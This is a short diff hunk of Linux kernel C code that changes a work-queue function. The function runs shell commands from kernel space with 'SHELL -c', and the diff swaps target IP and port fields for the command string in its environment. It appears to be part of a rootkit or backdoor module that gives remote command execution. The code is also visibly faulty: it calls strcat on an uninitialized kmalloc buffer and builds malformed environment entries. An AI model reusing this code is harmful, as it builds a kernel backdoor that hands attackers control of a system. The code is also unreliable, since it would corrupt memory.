@@ -62,7 +62,7 @@ void execute_command(struct work_struct *work)
 {
     int err;
     struct command_params *params = (struct command_params*)work;
-    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
+    char *envp[] = {HOME, TERM, params->command, NULL};
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     char *argv[] = {SHELL, "-c", exec, NULL};
     strcat(exec, params->command);
